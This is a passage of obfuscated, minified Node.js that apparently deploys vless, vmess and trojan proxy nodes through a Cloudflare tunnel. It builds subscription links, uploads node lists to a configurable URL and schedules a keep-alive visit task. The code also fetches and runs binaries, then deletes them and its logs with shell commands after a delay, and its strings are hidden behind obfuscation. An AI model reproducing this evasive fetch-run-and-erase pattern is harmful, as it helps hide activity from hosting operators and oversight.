Promise(_0x135a22=>{setTimeout(()=>{const _0x2f33c5={_0x48966f:0x1da},_0x458d6e=_0x5b25,_0x446ef4={'v':'2','ps':''+_0x501643,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x458d6e(0x1e9),'net':'ws','type':_0x458d6e(_0x47dcfc._0x122ee3),'host':_0x33f45b,'path':_0x458d6e(0x1ee),'tls':_0x458d6e(0x26b),'sni':_0x33f45b,'alpn':'','fp':'firefox'},_0x3335d4=_0x458d6e(0x203)+UUID+'@'+CFIP+':'+CFPORT+_0x458d6e(0x246)+_0x33f45b+_0x458d6e(0x221)+_0x33f45b+_0x458d6e(_0x47dcfc._0x2ffc4a)+_0x501643+_0x458d6e(_0x47dcfc._0x615c17)+Buffer['from'](JSON[_0x458d6e(_0x47dcfc._0x1f577a)](_0x446ef4))[_0x458d6e(_0x47dcfc._0x2a9cd6)](_0x458d6e(0x209))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x458d6e(0x1eb)+_0x33f45b+_0x458d6e(0x221)+_0x33f45b+_0x458d6e(_0x47dcfc._0x1377dd)+_0x501643+'\x0a\x20\x20\x20\x20';console[_0x458d6e(_0x47dcfc._0x2ee668)](Buffer[_0x458d6e(0x1da)](_0x3335d4)[_0x458d6e(_0x47dcfc._0x571ec3)](_0x458d6e(_0x47dcfc._0x464fca))),fs[_0x458d6e(_0x47dcfc._0x32317c)](subPath,Buffer[_0x458d6e(0x1da)](_0x3335d4)[_0x458d6e(0x281)](_0x458d6e(_0x47dcfc._0x464fca))),console[_0x458d6e(_0x47dcfc._0x2ee668)](FILE_PATH+_0x458d6e(_0x47dcfc._0x153e40)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4ce305,_0xb836a)=>{const _0xf4f6da=_0x458d6e,_0x475dfa=Buffer[_0xf4f6da(_0x2f33c5._0x48966f)](_0x3335d4)[_0xf4f6da(0x281)](_0xf4f6da(0x209));_0xb836a[_0xf4f6da(0x28b)](_0xf4f6da(0x20c),_0xf4f6da(0x1f2)),_0xb836a['send'](_0x475dfa);}),_0x135a22(_0x3335d4);},0x7d0);});}}async function uploadNodes(){const _0x2cd724={_0x1fcf71:0x211,_0x1feb76:0x1d2,_0xe1e962:0x254,_0x153618:0x1df,_0x95f6cd:0x231,_0x185f84:0x224,_0x40d8f0:0x272,_0x52f396:0x275},_0x31aa8b=_0x900c71;if(UPLOAD_URL&&PROJECT_URL){const _0x164721=PROJECT_URL+'/'+SUB_PATH,_0x23ed7b={'subscription':[_0x164721]};try{const _0x403ece=await axios[_0x31aa8b(0x272)](UPLOAD_URL+_0x31aa8b(_0x2cd724._0x1fcf71),_0x23ed7b,{'headers':{'Content-Type':'application/json'}});return _0x403ece&&_0x403ece[_0x31aa8b(0x218)]===0xc8?(console[_0x31aa8b(_0x2cd724._0x1feb76)](_0x31aa8b(0x238)),_0x403ece):null;}catch(_0x4f04c9){if(_0x4f04c9['response']){if(_0x4f04c9[_0x31aa8b(_0x2cd724._0xe1e962)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x31aa8b(0x208)](listPath))return;const _0x52bcdc=fs[_0x31aa8b(0x239)](listPath,_0x31aa8b(_0x2cd724._0x153618)),_0x22297b=_0x52bcdc['split']('\x0a')[_0x31aa8b(_0x2cd724._0x95f6cd)](_0x17b99e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x17b99e));if(_0x22297b[_0x31aa8b(_0x2cd724._0x185f84)]===0x0)return;const _0x579851=JSON[_0x31aa8b(0x1d7)]({'nodes':_0x22297b});try{const _0xfe5b33=await axios[_0x31aa8b(_0x2cd724._0x40d8f0)](UPLOAD_URL+'/api/add-nodes',_0x579851,{'headers':{'Content-Type':_0x31aa8b(_0x2cd724._0x52f396)}});return _0xfe5b33&&_0xfe5b33['status']===0xc8?(console[_0x31aa8b(_0x2cd724._0x1feb76)](_0x31aa8b(0x1ed)),_0xfe5b33):null;}catch(_0x2ed557){return null;}}else return;}}function cleanFiles(){const _0x1003e8={_0x43976a:0x202,_0x2e1ff0:0x24c,_0x54345e:0x25c,_0x39d726:0x284},_0x4504e4={_0x4e1894:0x27b};setTimeout(()=>{const _0x326a95={_0xbd4b8c:0x1d2},_0x11bad3=_0x5b25,_0x2feb37=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2feb37['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2feb37[_0x11bad3(_0x1003e8._0x43976a)](phpPath);process[_0x11bad3(_0x1003e8._0x2e1ff0)]===_0x11bad3(_0x1003e8._0x54345e)?exec(_0x11bad3(0x22a)+_0x2feb37[_0x11bad3(0x244)]('\x20')+'\x20>\x20nul\x202>&1',_0xabf7b4=>{const _0x4fbdca=_0x11bad3;console[_0x4fbdca(0x217)](),console[_0x4fbdca(0x1d2)](_0x4fbdca(_0x4504e4._0x4e1894)),console[_0x4fbdca(0x1d2)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x11bad3(_0x1003e8._0x39d726)+_0x2feb37[_0x11bad3(0x244)]('\x20')+_0x11bad3(0x25f),_0x30be2a=>{const _0x546473=_0x11bad3;console[_0x546473(0x217)](),console[_0x546473(_0x326a95._0xbd4b8c)](_0x546473(0x27b)),console['log'](_0x546473(0x223));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x17b503={_0x5f08e8:0x283,_0x3af967:0x1e6,_0x41243f:0x275,_0x11f508:0x235},_0x2dc91e=_0x900c71;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2dc91e(_0x17b503._0x5f08e8));return;}try{const _0x2efaae=await axios[_0x2dc91e(0x272)](_0x2dc91e(_0x17b503._0x3af967),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2dc91e(_0x17b503._0x41243f)}});return console[_0x2dc91e(0x1d2)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2efaae;}catch(_0x42c173){return console[_0x2dc91e(_0x17b503._0x11f508)](_0x2dc91e(0x28d)+_0x42c173[_0x2dc91e(0x216)]),null;}}async function startserver(){const _0x353350={_0x26937c:0x1fa},_0x3db38e=_0x900c71;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4a3b73){console[_0x3db38e(0x235)](_0x3db38e(_0x353350._0x26937c),_0x4a3b73);}}startserver()[_0x900c71(0x288)](_0x2ac4c7=>{const _0x422420={_0x4c8faa:0x235,_0x16d083:0x23a},_0x5f15ac=_0x900c71;console[_0x5f15ac(_0x422420._0x4c8faa)](_0x5f15ac(_0x422420._0x16d083),_0x2ac4c7);}),app['listen'](PORT,()=>console[_0x900c71(0x1d2)](_0x900c71(0x286)+PORT+'!'));
